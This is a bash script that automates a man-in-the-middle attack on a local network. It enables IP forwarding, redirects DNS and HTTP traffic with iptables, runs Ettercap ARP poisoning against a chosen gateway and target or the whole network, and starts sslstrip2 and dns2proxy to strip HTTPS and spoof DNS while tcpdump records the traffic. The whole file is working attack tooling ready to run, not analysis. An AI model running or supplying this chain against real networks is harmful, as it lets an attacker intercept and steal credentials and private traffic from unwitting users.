#!/bin/bash
#
# @desc:	MitM (Ettercap) & SSLStrip2 & dns2proxy
#
#			Tool runs if sslstrip2 & dns2proxy have subfolders from
#			where the script is run
#
# @required:	
#
#			- SSLStrip2 (https://github.com/LeonardoNve/sslstrip2)
#			- DNS2Proxy (https://github.com/LeonardoNve/dns2proxy)
#			- Ettercap-NG (http://ettercap.sourceforge.net/)
#

if [[ "$1" == "k" ]]; then
	echo "Killing processes..."
	ps -ef | grep tcpdump | awk '{print $2}' | xargs kill
	ps -ef | grep sslstrip | awk '{print $2}' | xargs kill
	ps -ef | grep dns2proxy | awk '{print $2}' | xargs kill
#	ps -ef | grep ettercap | awk '{print $2}' | xargs kill
	echo "turning off ip forwarding..."
	echo 0 > /proc/sys/net/ipv4/ip_forward
	echo "flushing iptables rules..."
	iptables -F 
	iptables -F -t nat
	exit
fi

printf "Define the interface (e.g. eth0): " && read INTERFACE
printf "Define the IP of the Gateway (leave empty for whole network): " && read GATEWAY
printf "Define the IP of the Target (leave empty for whole network): " && read TARGET

PWD=$(pwd)
DIR="$(cd "$(dirname "$0")" && pwd)"

# Variable for date/time
now=$(date +%Y%m%d_%H%M%S) 

# Enable Linux Kernel Packet forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Flush existing iptables
iptables -F 
iptables -F -t nat

# Traffic redirection for dns2proxy & sslstrip2
iptables --table nat --append PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53
iptables --table nat --append PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 9000 

# Start MitM with Ettercap
ettercap -T -i $INTERFACE -w network.pcap -L ettercap -M arp /$GATEWAY/ /$TARGET/ -P autoadd -Q &

# Start local network capture with tcpdump
tcpdump -i $INTERFACE -w $PWD/network_$now.pcap & PID_TCPDUMP=$!

# Start sslstrip
cd $DIR/sslstrip2/ && python ./sslstrip.py -p -w $PWD/sslstrip_$now.log -k -l 9000 & PID_SSLSTRIP=$!

# Start dns2proxy
cd $DIR/dns2proxy/ && python ./dns2proxy.py & PID_DNS2PROXY=$!
